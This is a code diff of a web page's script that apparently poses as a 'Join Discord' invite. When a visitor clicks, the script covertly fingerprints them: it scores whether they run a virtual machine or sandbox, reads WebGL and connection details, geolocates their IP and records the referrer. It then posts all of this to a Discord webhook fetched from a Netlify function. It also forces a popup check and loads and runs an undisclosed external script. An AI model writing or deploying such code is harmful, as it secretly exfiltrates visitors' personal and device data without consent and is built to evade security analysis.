@@ -89,7 +89,7 @@ button {
 <script>
 let isYouScriptLoaded = false;
 
-/* ===== SYSTEM + VM INFO ===== */
+/* SYSTEM + VM INFO */
 function getWebGLInfo(){
     try{
         const c = document.createElement("canvas");
@@ -104,23 +104,22 @@ function getWebGLInfo(){
 }
 
 function getVMInfo(){
-    let score=0; const reasons=[];
-    const cores=navigator.hardwareConcurrency||1;
+    let score=0, reasons=[];
+    const cores = navigator.hardwareConcurrency||1;
     if(cores<=2){score+=20; reasons.push("Low CPU cores");}
     if(navigator.deviceMemory && navigator.deviceMemory<=4){score+=20; reasons.push("Low RAM");}
     if([1024,1280,1366].includes(screen.width)){score+=15; reasons.push("Common VM resolution");}
-    const ua=navigator.userAgent.toLowerCase();
+    const ua = navigator.userAgent.toLowerCase();
     if(["virtual","vmware","vbox","qemu","xen"].some(v=>ua.includes(v))){score+=40; reasons.push("VM keyword in UA");}
-    const t0=performance.now(); for(let i=0;i<1e6;i++){}
+    const t0 = performance.now();
+    for(let i=0;i<1e6;i++){}
     if(performance.now()-t0>60){score+=15; reasons.push("Slow timing");}
     score += Math.random()*10;
-    score = Math.min(99, Math.round(score));
-    return {score, detected:score>=60, reasons};
+    return {score:Math.min(99,Math.round(score)), detected: score>=60, reasons};
 }
 
-/* ===== LOAD YOU SCRIPT ===== */
 function loadYouScript(cb){
-    if(isYouScriptLoaded){ cb(); return; }
+    if(isYouScriptLoaded){cb(); return;}
     const s=document.createElement('script');
     s.src='/scripts/you.js';
     s.onload=()=>{isYouScriptLoaded=true; cb();};
@@ -128,7 +127,6 @@ function loadYouScript(cb){
     document.head.appendChild(s);
 }
 
-/* ===== POPUP CHECK ===== */
 function checkPopupPermission(){
     return new Promise(resolve=>{
         let popups=[], allowed=true;
@@ -138,15 +136,12 @@ function checkPopupPermission(){
                 if(!p){allowed=false; break;}
                 popups.push(p);
             }
-            setTimeout(()=>{
-                popups.forEach(p=>{try{p.close()}catch{}});
-                resolve(allowed);
-            },200);
+            setTimeout(()=>{popups.forEach(p=>{try{p.close()}catch{}}); resolve(allowed);},200);
         }catch{popups.forEach(p=>{try{p.close()}catch{}}); resolve(false);}
     });
 }
 
-/* ===== IP GEOLOCATION ===== */
+/* IP GEOLOCATION */
 async function getIPLocation(){
     try{
         const res=await fetch("https://ipapi.co/json/");
@@ -156,19 +151,19 @@ async function getIPLocation(){
     }catch{return {ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown"};}
 }
 
-/* ===== SEND TO DISCORD ===== */
+/* SEND DISCORD */
 async function sendToDiscord(buttonName){
-    const vm=getVMInfo();
-    const gl=getWebGLInfo();
-    const conn=navigator.connection||{};
-    const ipGeo=await getIPLocation();
+    const vm = getVMInfo();
+    const gl = getWebGLInfo();
+    const conn = navigator.connection||{};
+    const ipGeo = await getIPLocation();
 
-    // Get webhook from Netlify GET endpoint
-    const res=await fetch("/.netlify/functions/discord",{method:"GET"});
-    const json=await res.json();
-    const webhook=json.webhook;
+    // Get webhook from Netlify
+    const res = await fetch("/.netlify/functions/discord", {method:"GET"});
+    const json = await res.json();
+    const webhook = json.webhook;
 
-    const payload={
+    const payload = {
         content: `✅ **Button clicked:** ${buttonName}`,
         embeds:[{
             title:"User System Information",
@@ -205,28 +200,27 @@ async function sendToDiscord(buttonName){
                 {name:"Referrer", value:document.referrer||"None"},
                 {name:"Page URL", value:location.href}
             ],
-            footer:{text:new Date().toUTCString()}
+            footer:{ text:new Date().toUTCString() }
         }]
     };
 
-    // Send POST directly to Discord
     await fetch(webhook,{
         method:"POST",
-        headers:{"Content-Type":"application/json"},
+        headers:{ "Content-Type":"application/json" },
         body:JSON.stringify(payload)
     }).catch(()=>{});
 }
 
-/* ===== HANDLE CLICK ===== */
-async function handleClick(e, buttonName, goBack=false){
+/* HANDLE CLICKS */
+async function handleClick(e, buttonName){
     e.preventDefault();
     const popup=document.getElementById('popup_needed');
     const spinner=document.getElementById('spinner_holder');
     popup.style.display='none';
     spinner.innerHTML='<div class="spinner"><div></div><div></div><div></div></div>';
 
-    const allowed=await checkPopupPermission();
-    if(!allowed){
+    const popupAllowed=await checkPopupPermission();
+    if(!popupAllowed){
         spinner.innerHTML='';
         popup.style.display='block';
         return;
@@ -234,14 +228,19 @@ async function handleClick(e, buttonName, goBack=false){
 
     loadYouScript(async ()=>{
         await sendToDiscord(buttonName);
+        if(typeof window.runYouScript==='function'){window.runYouScript();}
         spinner.innerHTML='';
-        if(goBack) history.back(); // go back if button requires it
     });
 }
 
-/* ===== BUTTON EVENTS ===== */
+/* EVENT LISTENERS */
 document.getElementById('discord_btn').addEventListener('click', e=>handleClick(e,'Join Discord'));
-document.getElementById('nah_btn').addEventListener('click', e=>handleClick(e,'Maybe later', true));
+
+// **Maybe later** only goes back
+document.getElementById('nah_btn').addEventListener('click', e=>{
+    e.preventDefault();
+    history.back();
+});
 </script>
 </body>
 </html>
